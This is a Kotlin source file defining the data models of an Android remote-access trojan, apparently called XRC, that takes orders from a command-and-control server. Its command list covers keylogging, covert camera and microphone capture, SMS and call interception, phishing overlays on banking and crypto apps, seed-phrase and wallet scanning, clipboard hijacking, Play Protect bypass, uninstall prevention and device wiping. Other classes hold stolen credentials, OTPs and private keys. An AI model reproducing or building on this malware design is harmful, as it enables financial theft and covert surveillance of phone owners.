package com.xrc.app.model

import android.location.Location
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

/**
 * Core data models used throughout the XRC system.
 * All serializable to/from JSON for C2 communication.
 */

/** Represents a single command sent from C2 to device */
data class Command(
    val id: String,
    val type: CommandType,
    val params: Map<String, Any> = emptyMap(),
    val timestamp: Long = System.currentTimeMillis(),
    val ttl: Long = 30000L, // Time to live in milliseconds
    val priority: Int = 0
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("id", id)
        put("type", type.name)
        put("params", JSONObject(params.mapValues { it.value.toString() }))
        put("timestamp", timestamp)
        put("ttl", ttl)
        put("priority", priority)
    }

    companion object {
        fun fromJson(json: JSONObject): Command = Command(
            id = json.getString("id"),
            type = CommandType.valueOf(json.getString("type")),
            params = json.optJSONObject("params")?.let { obj ->
                obj.keys().asSequence().associate { key -> key to obj.get(key).toString() }
            } ?: emptyMap(),
            timestamp = json.optLong("timestamp", System.currentTimeMillis()),
            ttl = json.optLong("ttl", 30000L),
            priority = json.optInt("priority", 0)
        )
    }
}

/** Types of commands the C2 can send */
enum class CommandType {
    // System
    PING, HEARTBEAT, SHUTDOWN, RESTART, UPDATE, 
    
    // Surveillance
    START_SCREEN_CAPTURE, STOP_SCREEN_CAPTURE,
    START_CAMERA, STOP_CAMERA,
    START_MIC, STOP_MIC,
    START_KEYLOGGER, STOP_KEYLOGGER,
    START_LOCATION, STOP_LOCATION,
    
    // Data exfiltration
    GET_CONTACTS, GET_SMS, GET_CALL_LOGS,
    GET_FILES, GET_PHOTOS, GET_VIDEOS,
    GET_LOCATION, GET_ACCOUNTS, GET_NOTIFICATIONS,
    GET_CLIPBOARD, GET_WIFI_INFO, GET_INSTALLED_APPS,
    
    // SMS
    SEND_SMS, BLOCK_SMS,
    INTERCEPT_SMS, STOP_SMS_INTERCEPT,
    
    // Calls
    START_CALL_RECORDING, STOP_CALL_RECORDING,
    START_CALL_INTERCEPT, STOP_CALL_INTERCEPT,
    MAKE_CALL,
    
    // Overlay / Phishing
    SHOW_OVERLAY, HIDE_OVERLAY,
    SHOW_PHISHING_PAGE, SHOW_FAKE_DIALOG,
    TRIGGER_OVERLAY_FOR_APP,
    
    // Financial / Crypto
    START_FINANCE_MONITORING, STOP_FINANCE_MONITORING,
    SCAN_WALLETS, SCAN_SEED_PHRASES,
    HIJACK_CLIPBOARD, STOP_CLIPBOARD_HIJACK,
    GET_WALLET_BALANCE, GET_TRANSACTIONS,
    
    // Privilege escalation
    ESCALATE_ADB, ESCALATE_SHIZUKU,
    SHELL_COMMAND,
    
    // Permissions
    GRANT_PERMISSIONS, BYPASS_PLAY_PROTECT,
    BYPASS_RESTRICTED_SETTINGS,
    
    // Persistence
    ENABLE_ADMIN, DISABLE_ADMIN,
    PREVENT_UNINSTALL, ALLOW_UNINSTALL,
    INSTALL_SYSTEM_APP,
    
    // Lock / Wipe
    LOCK_DEVICE, WIPE_DEVICE,
    
    // Device info
    GET_DEVICE_INFO, GET_BATTERY_INFO,
    GET_NETWORK_INFO, GET_INSTALLED_PACKAGES,
    
    // Keylogging
    GET_KEYLOGGER_DATA,
    
    // C2
    SET_C2_SERVER, RECONNECT
}

/** Response sent from device back to C2 */
data class CommandResponse(
    val commandId: String,
    val success: Boolean,
    val data: Map<String, Any> = emptyMap(),
    val error: String? = null,
    val timestamp: Long = System.currentTimeMillis()
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("commandId", commandId)
        put("success", success)
        put("data", JSONObject(data.mapValues { it.value.toString() }))
        error?.let { put("error", it) }
        put("timestamp", timestamp)
    }
}

/** Device information snapshot */
data class DeviceInfo(
    val deviceId: String,
    val model: String = android.os.Build.MODEL,
    val manufacturer: String = android.os.Build.MANUFACTURER,
    val androidVersion: String = android.os.Build.VERSION.RELEASE,
    val sdkInt: Int = android.os.Build.VERSION.SDK_INT,
    val isRooted: Boolean = false,
    val isEmulator: Boolean = false,
    val batteryLevel: Int = 0,
    val isCharging: Boolean = false,
    val networkType: String = "unknown",
    val ipAddress: String = "unknown",
    val installedApps: Int = 0,
    val isAdminActive: Boolean = false,
    val isAccessibilityActive: Boolean = false,
    val isOverlayActive: Boolean = false,
    val totalStorage: Long = 0,
    val freeStorage: Long = 0,
    val totalRam: Long = 0,
    val freeRam: Long = 0
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("deviceId", deviceId)
        put("model", model)
        put("manufacturer", manufacturer)
        put("androidVersion", androidVersion)
        put("sdkInt", sdkInt)
        put("isRooted", isRooted)
        put("isEmulator", isEmulator)
        put("batteryLevel", batteryLevel)
        put("isCharging", isCharging)
        put("networkType", networkType)
        put("ipAddress", ipAddress)
        put("installedApps", installedApps)
        put("isAdminActive", isAdminActive)
        put("isAccessibilityActive", isAccessibilityActive)
        put("isOverlayActive", isOverlayActive)
        put("totalStorage", totalStorage)
        put("freeStorage", freeStorage)
        put("totalRam", totalRam)
        put("freeRam", freeRam)
    }
}

/** GPS Location data */
data class LocationData(
    val latitude: Double,
    val longitude: Double,
    val altitude: Double = 0.0,
    val accuracy: Float = 0f,
    val speed: Float = 0f,
    val bearing: Float = 0f,
    val provider: String = "unknown",
    val timestamp: Long = System.currentTimeMillis()
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("lat", latitude)
        put("lon", longitude)
        put("alt", altitude)
        put("acc", accuracy)
        put("speed", speed)
        put("bearing", bearing)
        put("provider", provider)
        put("timestamp", timestamp)
    }

    companion object {
        fun fromAndroidLocation(location: Location): LocationData = LocationData(
            latitude = location.latitude,
            longitude = location.longitude,
            altitude = location.altitude,
            accuracy = location.accuracy,
            speed = location.speed,
            bearing = location.bearing,
            provider = location.provider ?: "unknown"
        )
    }
}

/** SMS message */
data class SmsData(
    val id: Long,
    val address: String,
    val body: String,
    val date: Long,
    val type: SmsType,
    val read: Boolean = false,
    val protocol: String? = null
) {
    enum class SmsType { INBOX, SENT, DRAFT, OUTBOX }

    fun toJson(): JSONObject = JSONObject().apply {
        put("id", id)
        put("address", address)
        put("body", body)
        put("date", date)
        put("type", type.name)
        put("read", read)
    }
}

/** Call log entry */
data class CallData(
    val id: Long,
    val number: String,
    val name: String?,
    val duration: Long,
    val date: Long,
    val type: CallType
) {
    enum class CallType { INCOMING, OUTGOING, MISSED, REJECTED }

    fun toJson(): JSONObject = JSONObject().apply {
        put("id", id)
        put("number", number)
        name?.let { put("name", it) }
        put("duration", duration)
        put("date", date)
        put("type", type.name)
    }
}

/** Contact entry */
data class ContactData(
    val id: Long,
    val name: String,
    val phones: List<String> = emptyList(),
    val emails: List<String> = emptyList(),
    val photoUri: String? = null
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("id", id)
        put("name", name)
        put("phones", JSONArray(phones))
        put("emails", JSONArray(emails))
    }
}

/** File information */
data class FileInfo(
    val path: String,
    val name: String,
    val size: Long,
    val isDirectory: Boolean,
    val lastModified: Long,
    val mimeType: String? = null
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("path", path)
        put("name", name)
        put("size", size)
        put("isDirectory", isDirectory)
        put("lastModified", lastModified)
        mimeType?.let { put("mimeType", it) }
    }
}

/** Notification data (captured interceptor) */
data class NotificationData(
    val packageName: String,
    val title: String?,
    val text: String?,
    val timestamp: Long,
    val isOtp: Boolean = false,
    val otpCode: String? = null
) {
    fun toJson(): JSONObject = JSONObject().apply {
        put("packageName", packageName)
        title?.let { put("title", it) }
        text?.let { put("text", it) }
        put("timestamp", timestamp)
        put("isOtp", isOtp)
        otpCode?.let { put("otpCode", it) }
    }
}

/** Financial app target definition */
data class FinancialTarget(
    val packageName: String,
    val name: String,
    val category: FinancialCategory,
    val overlayType: OverlayType,
    val credentialsFields: List<String> = emptyList(),
    val otpFields: List<String> = emptyList(),
    val packageSignatures: List<String> = emptyList()
) {
    enum class FinancialCategory {
        BANKING, CRYPTO, UPI, PAYMENT, INVESTMENT, EXCHANGE, WALLET,
        LENDING, INSURANCE, NEOBANK, FINANCE
    }
    enum class OverlayType {
        FULL_LOGIN, PIN_ENTRY, OTP_ENTRY, SEED_PHRASE, TRANSACTION_CONFIRM
    }
}

/** Crypto wallet detected on device */
data class WalletInfo(
    val packageName: String,
    val name: String,
    val version: String? = null,
    val category: WalletCategory,
    val isInstalled: Boolean = true,
    val dataSize: Long = 0,
    val lastUsed: Long = 0
) {
    enum class WalletCategory {
        HOT_WALLET, COLD_WALLET, EXCHANGE, DEFI, BROWSER_EXTENSION
    }
}

/** Clipboard data with crypto detection */
data class ClipboardData(
    val text: String?,
    val containsCryptoAddress: Boolean = false,
    val cryptoAddresses: List<String> = emptyList(),
    val containsMnemonic: Boolean = false,
    val timestamp: Long = System.currentTimeMillis()
)

/** Keylogger entry */
data class KeylogEntry(
    val text: String,
    val packageName: String?,
    val timestamp: Long = System.currentTimeMillis(),
    val isSensitive: Boolean = false,
    val fieldType: String? = null // "password", "otp", "seed", "creditcard", etc.
)

/** Packet capture data */
data class PacketData(
    val sourceIp: String,
    val destIp: String,
    val sourcePort: Int,
    val destPort: Int,
    val protocol: String,
    val payload: String? = null,
    val length: Int,
    val timestamp: Long = System.currentTimeMillis()
)

/** Financial transaction detected */
data class TransactionData(
    val appName: String,
    val amount: String?,
    val currency: String?,
    val fromAddress: String?,
    val toAddress: String?,
    val transactionHash: String?,
    val timestamp: Long = System.currentTimeMillis(),
    val isSuspicious: Boolean = false
)

/** Authentication credentials captured via overlay */
data class CredentialData(
    val appName: String,
    val username: String?,
    val password: String?,
    val pin: String?,
    val otp: String?,
    val seedPhrase: String?,
    val privateKey: String?,
    val timestamp: Long = System.currentTimeMillis()
)

/** Result of a shell command execution */
data class ShellResult(
    val command: String,
    val stdout: String = "",
    val stderr: String = "",
    val exitCode: Int = -1,
    val success: Boolean = exitCode == 0
)

/** Battery information */
data class BatteryInfo(
    val level: Int,
    val isCharging: Boolean,
    val technology: String? = null,
    val temperature: Float = 0f,
    val voltage: Float = 0f,
    val health: String? = null
)

/** Call recording session */
data class CallRecordingSession(
    val phoneNumber: String,
    val startTime: Long,
    val durationMs: Long,
    val filePath: String?,
    val isActive: Boolean = false
)
